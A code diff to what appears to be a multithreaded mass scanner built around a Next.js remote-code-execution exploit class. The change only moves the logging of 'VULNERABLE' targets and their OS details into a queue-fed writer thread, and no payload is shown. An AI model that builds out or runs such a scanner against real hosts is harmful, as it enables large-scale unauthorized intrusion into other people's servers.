@@ -22,10 +22,16 @@ import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, parse_qs, unquote, urljoin
 from datetime import datetime
+import queue
 
-print_lock = threading.Lock() 
+
+print_lock = threading.Lock()
+
+write_queue = queue.Queue()
+stop_writer = object()
 file_lock = threading.Lock()
 output_fh = open("vulnerable_targets.txt", "a", buffering=1)
+
 
 # 启用 readline 支持（上下箭头浏览历史命令）
 try:
@@ -48,6 +54,19 @@ logging.basicConfig(
     filemode='a'  # 追加模式
 )
 logger = logging.getLogger(__name__)
+def writer_thread():
+    with open("vulnerable_targets.txt", "a", buffering=1) as f:
+        while True:
+            item = write_queue.get()
+            if item is stop_writer:
+                break
+            f.write(item + "\n")
+            f.flush()
+
+
+writer = threading.Thread(target=writer_thread)
+writer.start()
+
 
 # 线程锁（用于打印输出）
 print_lock = threading.Lock()
@@ -1977,6 +1996,10 @@ class NextJSRCEExploit:
                 break
 
 
+           
+
+
+
 def verify_single_target(target, path, use_echo, use_dnslog, results, index, total, proxy=None):
     """
     验证单个目标（用于多线程）
@@ -2000,7 +2023,6 @@ def verify_single_target(target, path, use_echo, use_dnslog, results, index, tot
 
         # 静默验证
         result, os_info = exploit.verify_vulnerability_silent()
-
         if result is True:
             with print_lock:
                 print(f"\033[1;32m[+] VULNERABLE: {full_target}\033[0m")
@@ -2012,9 +2034,8 @@ def verify_single_target(target, path, use_echo, use_dnslog, results, index, tot
                 'os': os_info
             })
 
-            with file_lock:
-                output_fh.write(f"{full_target}|{os_info or ''}\n")
-                output_fh.flush()
+            write_queue.put(f"{full_target}|{os_info or ''}")
+
 
 
 
@@ -2087,6 +2108,7 @@ def batch_verify(targets_file, path=None, use_echo=True, use_dnslog=False, threa
     start_time = time.time()
     completed = 0
 
+
     # 使用线程池
     with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = {
@@ -2104,7 +2126,8 @@ def batch_verify(targets_file, path=None, use_echo=True, use_dnslog=False, threa
                     print(f"[*] Progress: {completed}/{total} ({completed*100//total}%) - {rate:.1f} targets/sec")
 
     elapsed_time = time.time() - start_time
-
+    write_queue.put(stop_writer)
+    writer.join() 
     # 输出总结
     print("\n" + "=" * 60)
     print("SUMMARY")
@@ -2308,6 +2331,7 @@ Examples:
         sys.exit(1)
 
 output_fh.close()
+
 
 if __name__ == '__main__':
     main()
